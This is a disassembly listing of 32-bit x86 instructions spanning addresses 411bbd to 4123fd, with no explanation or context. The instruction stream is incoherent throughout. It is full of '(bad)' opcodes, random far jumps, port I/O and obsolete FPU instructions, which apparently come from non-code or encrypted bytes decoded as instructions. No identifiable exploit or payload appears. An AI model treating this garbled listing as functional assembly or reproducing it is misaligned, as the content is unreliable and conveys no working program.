  411bbd:	mov    BYTE PTR [eax],0xef
  411bc0:	or     BYTE PTR [eax-0x151f4843],ch
  411bc6:	out    0xe6,eax
  411bc8:	loop   0x411ba5
  411bca:	in     al,dx
  411bcb:	mov    ch,0xd7
  411bcd:	xlat   BYTE PTR ds:[ebx]
  411bce:	clc    
  411bcf:	sti    
  411bd0:	rcl    ch,cl
  411bd2:	loop   0x411bd6
  411bd4:	aam    0x1
  411bd6:	(bad)  
  411bd7:	(bad)  
  411bd8:	or     cl,BYTE PTR [eax]
  411bda:	leave  
  411bdb:	jecxz  0x411bda
  411bdd:	add    DWORD PTR [ebx],edx
  411bdf:	vpsrlq ymm2,ymm6,xmm3
  411be3:	iret   
  411be4:	iret   
  411be5:	in     al,0xcc
  411be7:	rol    ch,0xdb
  411bea:	rcr    ebx,cl
  411bec:	jmp    0xf2d4:0xd7eff0d4
  411bf3:	div    ecx
  411bf5:	out    0xbd,eax
  411bf7:	aam    0x9
  411bf9:	(bad)  
  411bfb:	push   cs
  411bfc:	call   0xee2107df
  411c01:	mov    bl,0xe8
  411c03:	icebp  
  411c04:	fucom  st(1)
  411c06:	int    0xf5
  411c08:	jmp    0xf132f5be
  411c0d:	iret   
  411c0e:	repz in al,dx
  411c10:	ror    eax,cl
  411c12:	jecxz  0x411bf3
  411c14:	repz stc 
  411c16:	jmp    0x411c0a
  411c18:	or     ebx,ebp
  411c1a:	cmc    
  411c1b:	lds    ecx,FWORD PTR [ebx]
  411c1d:	(bad)  
  411c1f:	fiadd  WORD PTR [ebx+eax*8]
  411c22:	fucom  st(4)
  411c24:	call   0xf316cb15
  411c29:	enter  0xdfdf,0xe6
  411c2d:	shl    bl,cl
  411c2f:	jmp    0xd33214fd
  411c34:	jecxz  0x411bf4
  411c36:	repnz rcl eax,0xe3
  411c3a:	retf   0xc6f9
  411c3d:	clc    
  411c3e:	add    ebp,ecx
  411c40:	in     al,0xd8
  411c42:	retf   
  411c43:	scas   al,BYTE PTR es:[edi]
  411c44:	lods   eax,DWORD PTR ds:[esi]
  411c45:	int    0xb3
  411c47:	jmp    0x411c38
  411c49:	stc    
  411c4a:	mov    al,0xc9
  411c4c:	out    dx,al
  411c4d:	dec    ecx
  411c4f:	fbstp  TBYTE PTR [eax-0x1840f80e]
  411c55:	cli    
  411c56:	icebp  
  411c57:	or     dh,cl
  411c59:	icebp  
  411c5a:	imul   edx
  411c5c:	add    ebp,ebx
  411c5e:	or     eax,0xbcc2d8ec
  411c63:	shl    BYTE PTR [edx-0x49280418],1
  411c69:	fcmovnbe st,st(4)
  411c6b:	cli    
  411c6c:	(bad)  
  411c6d:	(bad)  
  411c6f:	mov    ecx,0xd203d7d2
  411c74:	lock faddp st(3),st
  411c77:	pop    es
  411c78:	mov    eax,0xc00be3dc
  411c7d:	add    eax,0xd80aea0b
  411c82:	mov    cl,0xd6
  411c84:	shr    cl,cl
  411c86:	aad    0xac
  411c88:	int3   
  411c89:	shr    esi,1
  411c8b:	icebp  
  411c8c:	shr    ch,cl
  411c8e:	cld    
  411c8f:	cli    
  411c90:	retf   0xdcc1
  411c93:	out    dx,al
  411c94:	in     eax,0xdd
  411c96:	clc    
  411c97:	add    dl,dl
  411c99:	jmp    0x411c59
  411c9b:	aad    0xd
  411c9d:	cld    
  411c9e:	retf   0x100
  411ca1:	mov    ebp,0xe0d6def2
  411ca6:	sar    bl,1
  411ca8:	hlt    
  411ca9:	mov    ch,0xeb
  411cab:	cmc    
  411cac:	lock xlat BYTE PTR ds:[ebx]
  411cae:	aam    0xba
  411cb0:	add    edi,edx
  411cb2:	jecxz  0x411c75
  411cb4:	aam    0x0
  411cb6:	fyl2x  
  411cb8:	fsin   
  411cba:	loop   0x411cb0
  411cbc:	add    ecx,DWORD PTR [edi]
  411cbe:	iret   
  411cbf:	in     eax,0x4
  411cc1:	test   al,0xb3
  411cc3:	iret   
  411cc4:	jmp    0xcb370396
  411cc9:	(bad)  
  411cca:	lock sti 
  411ccc:	mov    bh,0xc9
  411cce:	shr    eax,cl
  411cd0:	fmul   st,st(4)
  411cd2:	loope  0x411c93
  411cd4:	cld    
  411cd5:	fdivr  DWORD PTR [edx-0x1e2a1a23]
  411cdb:	les    ecx,FWORD PTR [edi]
  411cdd:	push   cs
  411cde:	in     eax,dx
  411cdf:	jmp    0xe6ea:0xeac1c403
  411ce6:	sti    
  411ce7:	int3   
  411ce8:	hlt    
  411ce9:	(bad)  
  411ceb:	aam    0xe4
  411ced:	cmc    
  411cee:	jecxz  0x411ca8
  411cf0:	sti    
  411cf1:	loopne 0x411cf3
  411cf3:	into   
  411cf4:	repz in al,dx
  411cf6:	loop   0x411cd2
  411cf8:	out    0xc0,al
  411cfa:	fdiv   st(3),st
  411cfc:	add    ecx,ebp
  411cfe:	out    0xec,al
  411d00:	adc    eax,ebx
  411d02:	iret   
  411d03:	ffree  st(7)
  411d05:	scas   eax,DWORD PTR es:[edi]
  411d06:	(bad)  
  411d07:	loop   0x411cd9
  411d09:	(bad)  
  411d0a:	hlt    
  411d0b:	(bad)  
  411d0c:	imul   dl
  411d0e:	in     al,0xf4
  411d10:	fneni(8087 only) 
  411d12:	dec    edi
  411d14:	fcom   st(1)
  411d16:	clc    
  411d17:	sti    
  411d18:	loopne 0x411d19
  411d1a:	lock (bad) 
  411d1d:	add    eax,DWORD PTR ds:0xc1dddafe
  411d23:	out    0xee,al
  411d25:	out    dx,al
  411d26:	in     al,0xad
  411d28:	shl    ebp,0xc4
  411d2b:	aad    0xff
  411d2d:	iret   
  411d2e:	cli    
  411d2f:	(bad)  
  411d30:	jecxz  0x411d24
  411d32:	(bad)  
  411d34:	mov    esi,0xfffdd7d0
  411d39:	jmp    0xec4d142e
  411d3e:	(bad)
  411d41:	mov    bl,0xc2
  411d43:	into   
  411d44:	enter  0xb4b7,0xe0
  411d48:	loop   0x411cfb
  411d4a:	retf   0xb8c4
  411d4d:	mov    bh,0xc9
  411d4f:	into   
  411d50:	mov    edx,0xdab9bec3
  411d55:	mov    ebx,0x3c1c6f5
  411d5a:	fcmovne st,st(2)
  411d5c:	shl    bl,0x7
  411d5f:	or     eax,0xc9a9b1d3
  411d64:	in     al,0xc8
  411d66:	fsubr  QWORD PTR [ecx-0x18084a07]
  411d6c:	in     al,dx
  411d6d:	mov    dh,0xd6
  411d6f:	call   0xf3301444
  411d74:	ret    
  411d75:	repnz add dh,cl
  411d78:	jmp    0x3012c80
  411d7d:	add    al,0xdb
  411d7f:	out    0xfc,al
  411d81:	jecxz  0x411d48
  411d83:	icebp  
  411d84:	lods   eax,DWORD PTR ds:[esi]
  411d85:	repnz out 0xb4,eax
  411d88:	mov    al,0xd0
  411d8a:	aam    0xe6
  411d8c:	mov    edx,0xdbbbdede
  411d91:	clc    
  411d92:	rcl    esi,0xf7
  411d95:	out    0xc6,al
  411d97:	xlat   BYTE PTR ds:[ebx]
  411d98:	xlat   BYTE PTR ds:[ebx]
  411d99:	add    eax,0xf9edffff
  411d9e:	fcmovu st,st(7)
  411da0:	in     eax,0xea
  411da2:	rol    eax,1
  411da4:	jmp    0x411d59
  411da6:	out    0xf6,eax
  411da8:	mov    ah,0xd9
  411daa:	int    0xad
  411dac:	repnz clc 
  411dae:	out    dx,al
  411daf:	ret    
  411db0:	jmp    0xd805:0x2d6ede0
  411db7:	loopne 0x411d94
  411db9:	(bad)  
  411dba:	loope  0x411db3
  411dbc:	add    eax,0xfefcf9fa
  411dc1:	(bad)  
  411dc3:	mov    bl,0xc3
  411dc5:	jmp    0xe628f2bf
  411dca:	loopne 0x411dc2
  411dcc:	int3   
  411dcd:	fmul   st(1),st
  411dcf:	jmp    0x411dae
  411dd1:	in     al,dx
  411dd2:	mov    edx,0xdbc6f0df
  411dd7:	pop    es
  411dd8:	fld    DWORD PTR [ebx]
  411dda:	jecxz  0x411db2
  411ddc:	out    0x6,al
  411dde:	fucomip st,st(2)
  411de0:	int3   
  411de1:	out    dx,eax
  411de2:	fdiv   QWORD PTR [ebx-0x1e0e3652]
  411de8:	test   al,0xfa
  411dea:	stc    
  411deb:	icebp  
  411dec:	rcr    al,cl
  411dee:	mov    dh,0xff
  411df0:	enter  0xecbb,0xc0
  411df4:	lock int3 
  411df6:	aam    0xd8
  411df8:	loopne 0x411de4
  411dfa:	fsubr  st(0),st
  411dfc:	dec    DWORD PTR [ebx]
  411dfe:	add    al,0xe4
  411e00:	out    0xd3,eax
  411e02:	(bad)  
  411e03:	lock enter 0xc7d3,0xb4
  411e08:	mov    bl,0xd2
  411e0a:	cli    
  411e0b:	fcmovnu st,st(1)
  411e0d:	(bad)  
  411e0f:	jecxz  0x411ded
  411e11:	add    BYTE PTR [esi-0x343262b],bh
  411e17:	fdivr  QWORD PTR [eax-0x1e293d02]
  411e1d:	retf   0xe9d8
  411e20:	retf   0xe6c4
  411e23:	in     al,dx
  411e24:	jecxz  0x411e13
  411e26:	retf   
  411e27:	(bad)  
  411e28:	mov    ch,0xf9
  411e2a:	rcl    dh,cl
  411e2c:	xlat   BYTE PTR ds:[ebx]
  411e2d:	mov    ebp,0xbcf4c3dc
  411e32:	mov    edx,0xd607cef9
  411e37:	hlt    
  411e38:	mov    BYTE PTR [ebx],0xfe
  411e3b:	(bad)  
  411e3c:	(bad)  
  411e3e:	(bad)  
  411e40:	add    ah,cl
  411e42:	retf   0xc0be
  411e45:	rcr    ebx,1
  411e47:	mov    ebx,0xd0e8b3e1
  411e4c:	stc    
  411e4d:	jmp    0xbc010b3e
  411e52:	add    ch,bh
  411e54:	shl    dh,0x6
  411e57:	rol    BYTE PTR [esi],cl
  411e59:	cld    
  411e5a:	(bad)  
  411e5c:	or     dl,ch
  411e5e:	fcmovne st,st(2)
  411e60:	add    bl,al
  411e62:	ror    bh,cl
  411e64:	rcl    edx,cl
  411e66:	rol    eax,1
  411e68:	loop   0x411e2f
  411e6a:	mov    al,0xce
  411e6c:	in     eax,dx
  411e6d:	aad    0x3
  411e6f:	aad    0xd7
  411e71:	ret    
  411e72:	mov    dh,0xcc
  411e74:	ret    0xe3fd
  411e77:	cli    
  411e78:	clc    
  411e79:	fisttp QWORD PTR [ebx]
  411e7b:	(bad)  
  411e7c:	add    eax,0xfaced4e6
  411e81:	leave  
  411e82:	out    0xdc,eax
  411e84:	scas   al,BYTE PTR es:[edi]
  411e85:	cmc    
  411e86:	repz shl ch,0xc4
  411e8a:	(bad)  
  411e8b:	fucomi st,st(3)
  411e8d:	call   0xee0b087a
  411e92:	in     al,dx
  411e93:	push   es
  411e94:	ret    
  411e95:	add    al,0x0
  411e97:	or     bl,ah
  411e99:	aam    0xd7
  411e9b:	syscall 
  411e9d:	hlt    
  411e9e:	in     al,dx
  411e9f:	adc    bl,cl
  411ea1:	lock in al,dx
  411ea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ea4:	loope  0x411e96
  411ea6:	test   ebx,0xffc6e6d4
  411eac:	mov    bh,0xca
  411eae:	mov    edi,0xe1c3faed
  411eb3:	inc    BYTE PTR [esi]
  411eb5:	add    edx,esp
  411eb7:	icebp  
  411eb8:	rol    DWORD PTR [edx+eax*8],0xff
  411ebc:	(bad)  
  411ebd:	sti    
  411ebe:	(bad)
  411ec2:	fdivr  QWORD PTR [ebp-0x37091c0a]
  411ec8:	repz out dx,al
  411eca:	in     eax,dx
  411ecb:	mov    bh,0xe4
  411ecd:	fpatan 
  411ecf:	jmp    0xd32de88c
  411ed4:	rol    eax,cl
  411ed6:	in     al,0xf4
  411ed8:	(bad)  
  411ed9:	fadd   st(4),st
  411edb:	jmp    0x4411ced
  411ee0:	(bad)  
  411ee1:	call   0xd226eea3
  411ee6:	icebp  
  411ee7:	repz fidiv DWORD PTR [edx-0x4a131639]
  411eee:	div    DWORD PTR [ecx+edi*4-0x2a30023d]
  411ef5:	mov    dl,0xb
  411ef8:	(bad)  
  411ef9:	or     ch,bl
  411efb:	hlt    
  411efc:	leave  
  411efd:	add    BYTE PTR [edx],al
  411eff:	in     al,dx
  411f00:	jmp    0xd1f910e4
  411f05:	leave  
  411f06:	(bad)  
  411f08:	out    0xb2,al
  411f0a:	(bad)  
  411f0c:	aam    0xb8
  411f0e:	enter  0xfabf,0xfc
  411f12:	out    dx,al
  411f13:	std    
  411f14:	int3   
  411f15:	hlt    
  411f16:	loopne 0x411ed9
  411f18:	sti    
  411f19:	shr    ecx,1
  411f1b:	out    dx,eax
  411f1c:	out    dx,eax
  411f1d:	or     ah,bh
  411f1f:	retf   
  411f20:	loopne 0x411ef3
  411f22:	(bad)
  411f25:	into   
  411f26:	jmp    0xf410e41a
  411f2b:	(bad)  
  411f2c:	aad    0xf2
  411f2e:	fst    st(3)
  411f30:	mov    ah,0xd3
  411f32:	out    dx,al
  411f33:	loop   0x411f1a
  411f35:	push   es
  411f36:	in     al,0xf2
  411f38:	jmp    0x411efe
  411f3a:	std    
  411f3b:	ffree  st(5)
  411f3d:	std    
  411f3e:	std    
  411f3f:	add    al,0xc
  411f41:	out    0xcb,eax
  411f43:	jecxz  0x411f29
  411f45:	jmp    0xeff5:0xe7dab0c4
  411f4c:	mov    edx,0xccc903be
  411f51:	add    esi,ebp
  411f53:	(bad)  
  411f54:	stc    
  411f55:	(bad)  
  411f56:	cli    
  411f57:	fadd   DWORD PTR [esi+ebx*8]
  411f5a:	(bad)
  411f5d:	jecxz  0x411f6e
  411f5f:	smsw   esp
  411f62:	mov    al,0xdc
  411f64:	ror    cl,cl
  411f66:	ret    0xe0ad
  411f69:	aam    0xdf
  411f6b:	in     al,dx
  411f6c:	fcmovu st,st(3)
  411f6e:	(bad)  
  411f6f:	out    dx,eax
  411f70:	mov    edx,0xed03d500
  411f75:	ret    
  411f76:	add    cl,bh
  411f78:	(bad)  
  411f79:	fadd   QWORD PTR [edi]
  411f7b:	(bad)  
  411f7c:	(bad)  
  411f7d:	std    
  411f7e:	(bad)  
  411f80:	fnstcw WORD PTR [ebp-0x291f4f50]
  411f86:	lods   eax,DWORD PTR ds:[esi]
  411f87:	xlat   BYTE PTR ds:[ebx]
  411f88:	in     al,dx
  411f89:	shl    edx,cl
  411f8b:	jmp    0xbbf2:0xead7f1f4
  411f92:	add    al,bl
  411f94:	loopne 0x411f89
  411f96:	jmp    0x411f96
  411f98:	retf   0x904
  411f9b:	pop    es
  411f9c:	out    0xe6,eax
  411f9e:	add    ah,bh
  411fa0:	rcr    dh,0xf1
  411fa3:	(bad)  
  411fa4:	jmp    0xc8f9:0xd5eaf5f6
  411fab:	in     al,dx
  411fac:	mov    al,0xd3
  411fae:	fiadd  DWORD PTR [ebx]
  411fb0:	add    ebx,edi
  411fb2:	enter  0xd4b8,0xdc
  411fb6:	int3   
  411fb7:	sti    
  411fb8:	icebp  
  411fb9:	aam    0xd6
  411fbb:	in     eax,0xf8
  411fbd:	int    0xe0
  411fbf:	cli    
  411fc0:	add    ecx,ebp
  411fc2:	into   
  411fc3:	fdivrp st(7),st
  411fc5:	(bad)  
  411fc6:	xlat   BYTE PTR ds:[ebx]
  411fc7:	loop   0x411f9e
  411fc9:	in     al,dx
  411fca:	aam    0xd2
  411fcc:	mov    ecx,0xd7f7fcc9
  411fd1:	ret    
  411fd2:	(bad)  
  411fd4:	pop    es
  411fd5:	(bad)  
  411fd6:	(bad)  
  411fd7:	std    
  411fd8:	jmp    0xf90624bb
  411fdd:	ret    
  411fde:	(bad)  
  411fe0:	adc    DWORD PTR [edi-0x133a511a],esp
  411fe6:	out    dx,eax
  411fe7:	fnsetpm(287 only) 
  411fe9:	(bad)  
  411fea:	scas   al,BYTE PTR es:[edi]
  411feb:	int    0xf0
  411fed:	(bad)  
  411fee:	jmp    0xe0f2:0x30201b4
  411ff5:	repnz fptan 
  411ff8:	or     eax,esi
  411ffa:	(bad)  
  411ffb:	fcmovb st,st(4)
  411ffd:	or     ah,dh
  411fff:	(bad)  
  412000:	in     eax,dx
  412001:	loope  0x411fe5
  412003:	into   
  412004:	(bad)
  412007:	in     al,0xf0
  412009:	call   0xf12ef1f8
  41200e:	mov    ecx,0xf6e1c9b9
  412013:	cli    
  412014:	shl    esp,cl
  412016:	ret    
  412017:	icebp  
  412018:	inc    ebp
  41201a:	ret    0xe9ff
  41201d:	loope  0x412005
  41201f:	iret   
  412020:	or     al,0xb3
  412022:	test   eax,0xb3d1e8ee
  412027:	out    dx,al
  412028:	retf   
  412029:	rcl    ebp,cl
  41202b:	cmc    
  41202c:	(bad)  
  41202e:	retf   0xffd5
  412031:	aam    0xce
  412033:	int    0xc3
  412035:	ffreep st(2)
  412037:	loopne 0x412032
  412039:	retf   0xe6f5
  41203c:	(bad)  
  41203e:	fiadd  DWORD PTR [ebx+esi*8]
  412041:	out    0xc4,eax
  412043:	iret   
  412044:	repz retf 
  412046:	rol    esp,cl
  412048:	repnz (bad) 
  41204a:	iret   
  41204b:	shl    ecx,1
  41204d:	mov    ch,0xfe
  41204f:	neg    ch
  412051:	in     al,dx
  412052:	in     al,dx
  412053:	(bad)  
  412055:	aad    0xe6
  412057:	out    0xc6,eax
  412059:	fadd   QWORD PTR [edi]
  41205b:	fcmovb st,st(7)
  41205d:	in     al,0xea
  41205f:	clc    
  412060:	add    eax,0xdccec4dd
  412065:	lock (bad) 
  412067:	icebp  
  412068:	in     al,0xbb
  41206a:	fucomi st,st(4)
  41206c:	mov    eax,0xf2f0faca
  412071:	fsub   st,st(0)
  412073:	loop   0x41204c
  412075:	push   es
  412076:	cli    
  412077:	mov    ebp,0xe805fde9
  41207c:	jmp    0x412072
  41207e:	cli    
  41207f:	loopne 0x41208d
  412081:	scas   al,BYTE PTR es:[edi]
  412082:	repnz (bad) 
  412084:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412085:	mov    dl,0xf5
  412087:	jecxz  0x41203e
  412089:	mov    ah,0xbb
  41208b:	lock lods al,BYTE PTR ds:[esi]
  41208d:	aam    0xce
  41208f:	lock mov edx,0xffdadddf
  412095:	fcmovnbe st,st(5)
  412097:	fadd   st(2),st
  412099:	cmc    
  41209a:	(bad)
  41209d:	cli    
  41209e:	into   
  41209f:	out    dx,al
  4120a0:	out    0xb2,eax
  4120a2:	int3   
  4120a3:	xlat   BYTE PTR ds:[ebx]
  4120a4:	mov    bl,0xbd
  4120a6:	sti    
  4120a7:	mul    ch
  4120a9:	int3   
  4120aa:	hlt    
  4120ab:	jmp    0xb9ea:0xd7eefade
  4120b2:	int    0xed
  4120b4:	(bad)  
  4120b6:	std    
  4120b7:	(bad)  
  4120b8:	out    0x7,eax
  4120ba:	ret    0xf5eb
  4120bd:	retf   0xc5fb
  4120c0:	retf   
  4120c1:	mov    ecx,0xedaccdaf
  4120c6:	loopne 0x4120b9
  4120c8:	mov    dh,0xed
  4120ca:	in     eax,dx
  4120cb:	(bad)
  4120ce:	enter  0xd0f9,0xfe
  4120d2:	aad    0xdd
  4120d4:	mov    eax,0xf8db01e2
  4120d9:	add    al,0xfe
  4120db:	fmul   st(6),st
  4120dd:	lds    ecx,FWORD PTR [edi]
  4120df:	call   0xea23cec7
  4120e4:	out    0xf0,eax
  4120e6:	retf   
  4120e7:	icebp  
  4120e8:	retf   
  4120e9:	mov    edx,0xf5c4f9b1
  4120ee:	mov    esp,0xbff3f9d1
  4120f3:	into   
  4120f4:	mov    edi,0xcaf9ebd1
  4120f9:	add    ecx,DWORD PTR [edx]
  4120fb:	pop    es
  4120fc:	(bad)  
  4120fe:	fadd   st(1),st
  412100:	pop    es
  412101:	mov    ebp,0xf3eca8e9
  412106:	loopne 0x4120d2
  412108:	shr    edx,0xb8
  41210b:	(bad)  
  41210c:	(bad)
  41210f:	fld    st(3)
  412111:	out    dx,al
  412112:	ret    0xd5e2
  412115:	add    edx,ecx
  412117:	fdiv   st(4),st
  412119:	clc    
  41211a:	add    DWORD PTR [eax],eax
  41211c:	aad    0xf8
  41211e:	iret   
  41211f:	loope  0x4120ee
  412121:	fmulp  st(4),st
  412123:	mov    edi,0xecc5b6ee
  412128:	mov    dh,0xea
  41212a:	aam    0xfe
  41212c:	cli    
  41212d:	les    esi,FWORD PTR [ebx+ebp*8-0x110b3e46]
  412134:	repz loopne 0x412128
  412137:	(bad)
  41213a:	out    0xe4,al
  41213c:	out    0xeb,eax
  41213e:	iret   
  41213f:	jmp    0xc5f1:0xeac3f0de
  412146:	(bad)  
  412147:	retf   0xcaba
  41214a:	hlt    
  41214b:	les    esi,FWORD PTR [edi-0x30270828]
  412151:	rol    DWORD PTR [eax],cl
  412153:	hlt    
  412154:	(bad)  
  412156:	fnstcw WORD PTR [ebp-0x200a3d05]
  41215c:	(bad)  
  41215e:	in     eax,dx
  41215f:	fucom  st(0)
  412161:	(bad)  
  412162:	repnz in eax,0xca
  412165:	mov    esp,0xd9fba9b7
  41216a:	lock jmp 0xf3c9:0xb9dadfde
  412172:	fpatan 
  412174:	ret    
  412175:	test   BYTE PTR [esi],0x5
  412178:	frstpm(287 only) 
  41217a:	add    eax,0xf80906e6
  41217f:	call   0xb40ee357
  412184:	in     eax,0xe1
  412186:	icebp  
  412187:	in     al,0xe0
  412189:	fidiv  DWORD PTR [esi-0x152f2246]
  41218f:	(bad)  
  412191:	repz aam 0xde
  412194:	out    0xe4,eax
  412196:	repz (bad) 
  412199:	shl    esp,1
  41219b:	call   0xe72fef7e
  4121a0:	in     al,0xe3
  4121a2:	repz rol cl,cl
  4121a5:	retf   0xd4e7
  4121a8:	stc    
  4121a9:	mov    ch,0xfb
  4121ab:	fcmovu st,st(2)
  4121ad:	iret   
  4121ae:	jmp    0x4121a4
  4121b0:	in     eax,dx
  4121b1:	mov    bh,0xd4
  4121b3:	mov    edi,0xf6e7f3cd
  4121b8:	fdivrp st(7),st
  4121ba:	hlt    
  4121bb:	add    BYTE PTR [ecx],al
  4121bd:	psubw  mm6,mm3
  4121c0:	fcmovb st,st(6)
  4121c2:	test   al,0xc5
  4121c4:	(bad)
  4121c7:	mov    ch,0xe4
  4121c9:	into   
  4121ca:	div    cl
  4121cc:	mov    eax,0xd3dbe3da
  4121d1:	shl    ecx,0xf7
  4121d4:	std    
  4121d5:	(bad)  
  4121d6:	add    BYTE PTR [esi],al
  4121d8:	aam    0xa
  4121da:	loope  0x4121d3
  4121dc:	retf   
  4121dd:	cld    
  4121de:	ret    0xdcdb
  4121e1:	(bad)  
  4121e2:	out    dx,eax
  4121e3:	out    0xc5,al
  4121e5:	scas   eax,DWORD PTR es:[edi]
  4121e6:	ror    ebp,0xd9
  4121e9:	icebp  
  4121ea:	mov    dh,0xce
  4121ec:	iret   
  4121ed:	fmulp  st(7),st
  4121ef:	rol    BYTE PTR [ecx],1
  4121f1:	shr    eax,cl
  4121f3:	fxam   
  4121f5:	shl    bl,cl
  4121f7:	cmc    
  4121f8:	or     edx,ecx
  4121fa:	in     al,0x8
  4121fc:	(bad)  
  4121fd:	fcmovne st,st(4)
  4121ff:	add    cl,bl
  412201:	retf   
  412202:	scas   al,BYTE PTR es:[edi]
  412203:	in     al,dx
  412204:	mov    cl,0xd5
  412206:	neg    bl
  412208:	(bad)  
  412209:	iret   
  41220a:	in     eax,dx
  41220b:	in     al,dx
  41220c:	neg    ah
  41220e:	sti    
  41220f:	int    0xc9
  412211:	sti    
  412212:	int    0xf3
  412214:	call   ecx
  412216:	repz add al,BYTE PTR ds:0xc4def9fe
  41221d:	or     cl,BYTE PTR [edx]
  41221f:	in     al,0xf
  412221:	iret   
  412222:	jmp    0xf2c9:0xe5f2eee8
  412229:	jmp    0xccd3:0xf7ccd5f3
  412230:	leave  
  412231:	loop   0x412229
  412233:	shl    edx,1
  412235:	in     al,dx
  412236:	stc    
  412237:	cli    
  412238:	add    eax,0xe6e8e503
  41223d:	lds    eax,FWORD PTR [ebx]
  41223f:	leave  
  412240:	repz (bad) 
  412242:	jmp    0x41220c
  412244:	mov    bh,0xbc
  412246:	mov    ch,0xc0
  412248:	sti    
  412249:	in     eax,dx
  41224a:	(bad)  
  41224b:	imul   dh
  41224d:	int    0xfc
  41224f:	mov    ch,0xd2
  412251:	(bad)  
  412253:	mul    edi
  412255:	shl    bh,cl
  412257:	stc    
  412258:	(bad)  
  41225a:	cli    
  41225b:	(bad)  
  41225c:	add    edi,ebx
  41225e:	fstp   st(4)
  412260:	into   
  412261:	in     eax,dx
  412262:	sar    BYTE PTR [esi-0x4d3d4a3b],cl
  412268:	test   esp,0xbecfc8e9
  41226e:	mov    eax,0xc0e0dbd5
  412273:	add    edi,esi
  412275:	add    al,ah
  412277:	add    eax,DWORD PTR ds:0xd9fbeb03
  41227d:	(bad)
  412280:	into   
  412281:	rol    esp,cl
  412283:	ret    
  412284:	jecxz  0x412270
  412286:	mov    ah,0xca
  412288:	mov    dl,0xe4
  41228a:	mov    ebx,0xbcddf3e6
  41228f:	fdivrp st(5),st
  412291:	repnz fstp TBYTE PTR [eax+eiz*8-0x26f91921]
  412299:	leave  
  41229a:	mov    BYTE PTR [ebp*8-0x16033028],0xee
  4122a2:	sar    BYTE PTR [ebp-0x4e3b4311],0xb5
  4122a9:	(bad)  
  4122ac:	lods   al,BYTE PTR ds:[esi]
  4122ad:	repz icebp 
  4122af:	sti    
  4122b0:	fsqrt  
  4122b2:	ret    0xbfcf
  4122b5:	in     eax,0xf6
  4122b7:	ret    0x9c3
  4122ba:	add    edx,edi
  4122bc:	fadd   QWORD PTR [esi+ecx*1]
  4122bf:	repnz or al,0xd0
  4122c2:	jmp    0x4122b2
  4122c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122c5:	rol    edi,1
  4122c7:	mov    ah,0xca
  4122c9:	shl    eax,1
  4122cb:	frstpm(287 only) 
  4122cd:	clc    
  4122ce:	mov    edx,0xf6d8d4cc
  4122d3:	rcl    dh,0xd0
  4122d6:	add    eax,0x5c6d1f3
  4122db:	ror    esi,0xde
  4122de:	or     eax,0xf7bd11ef
  4122e3:	shr    bh,cl
  4122e5:	repz (bad) 
  4122e7:	test   eax,0xb5c5b0ea
  4122ec:	in     al,dx
  4122ed:	iret   
  4122ee:	int3   
  4122ef:	hlt    
  4122f0:	loope  0x4122c0
  4122f2:	out    0xec,eax
  4122f4:	mov    ah,0xbe
  4122f6:	clc    
  4122f7:	(bad)  
  4122f8:	rol    DWORD PTR [edi],1
  4122fa:	fcomip st,st(5)
  4122fc:	loope  0x412306
  4122fe:	adc    edi,ebx
  412300:	add    al,0xd8
  412302:	fcom   st(3)
  412304:	aad    0xf1
  412306:	aad    0xc0
  412308:	repnz (bad) 
  41230a:	cmc    
  41230b:	fidivr WORD PTR [edx-0x25063446]
  412311:	enter  0xf2d5,0xcc
  412315:	hlt    
  412316:	push   ebx
  412318:	jmp    0xe205:0xcefdd6de
  41231f:	jmp    0xdd240608
  412324:	mov    dh,0xc3
  412326:	ret    
  412327:	aad    0xf3
  412329:	mov    ecx,0xdab5f6f8
  41232e:	in     al,0xce
  412330:	loop   0x412306
  412332:	in     al,dx
  412333:	sar    ah,0xd0
  412336:	hlt    
  412337:	fdivr  DWORD PTR [eax+eiz*8-0x4f6f00c]
  41233e:	add    dl,ah
  412340:	push   es
  412341:	leave  
  412342:	test   al,0xd7
  412344:	(bad)  
  412345:	loope  0x412310
  412347:	aam    0xef
  412349:	scas   eax,DWORD PTR es:[edi]
  41234a:	icebp  
  41234b:	in     eax,0xff
  41234d:	in     eax,0xc9
  41234f:	iret   
  412350:	std    
  412351:	call   0xdd13180c
  412356:	std    
  412357:	out    0xeb,al
  412359:	(bad)  
  41235a:	(bad)  
  41235b:	cli    
  41235c:	retf   0xfd09
  41235f:	out    0xd,eax
  412361:	mov    edi,0xbcb6eeaa
  412366:	jmp    0xdafe:0xb9e5c9c1
  41236d:	jmp    0x412362
  41236f:	mov    eax,0xc1f2c3d1
  412374:	div    dh
  412376:	sti    
  412377:	or     edi,ecx
  412379:	(bad)  
  41237a:	clc    
  41237b:	iret   
  41237c:	enter  0xe6c6,0x13
  412380:	adc    dh,BYTE PTR [edx-0x541e3a50]
  412386:	ret    0xe7ef
  412389:	aad    0xe6
  41238b:	cli    
  41238c:	stc    
  41238d:	sti    
  41238e:	stc    
  41238f:	mov    esp,0xdcfbef
  412394:	cli    
  412395:	lock mov cl,0xdd
  412399:	fld    QWORD PTR [edx]
  41239b:	or     esp,ebp
  41239d:	fisttp DWORD PTR [ebx]
  41239f:	sti    
  4123a0:	jmp    0xc4ea:0xbccebcde
  4123a7:	mov    ebx,0xf6b0edd4
  4123ac:	xlat   BYTE PTR ds:[ebx]
  4123ad:	fmul   st(7),st
  4123af:	aad    0x3
  4123b1:	inc    DWORD PTR [ebx]
  4123b3:	add    ah,al
  4123b5:	(bad)  
  4123b6:	div    ecx
  4123b8:	jmp    0x4123b2
  4123ba:	(bad)  
  4123bb:	cld    
  4123bc:	call   0xcb54e8c8
  4123c1:	in     al,dx
  4123c2:	ret    0xebe7
  4123c5:	jmp    0x4123af
  4123c7:	mov    al,0xcb
  4123c9:	fcomp  st(3)
  4123cb:	icebp  
  4123cc:	jmp    0x41239a
  4123ce:	mov    esi,0xf2bdd9fc
  4123d3:	loope  0x4123ce
  4123d5:	in     eax,dx
  4123d6:	aad    0xd5
  4123d8:	mov    eax,0xd8f5d7c2
  4123dd:	(bad)  
  4123df:	iret   
  4123e0:	retf   
  4123e1:	int    0xb0
  4123e3:	mov    al,0xb6
  4123e5:	jecxz  0x41239c
  4123e7:	int    0xf0
  4123e9:	hlt    
  4123ea:	int    0xf5
  4123ec:	aam    0xf4
  4123ee:	aad    0xed
  4123f0:	ret    0x7d0
  4123f3:	add    BYTE PTR [edi],al
  4123f5:	pop    es
  4123f6:	inc    esi
  4123f8:	(bad)  
  4123fa:	(bad)  
  4123fb:	sti    
  4123fc:	cli    
  4123fd:	(bad)  
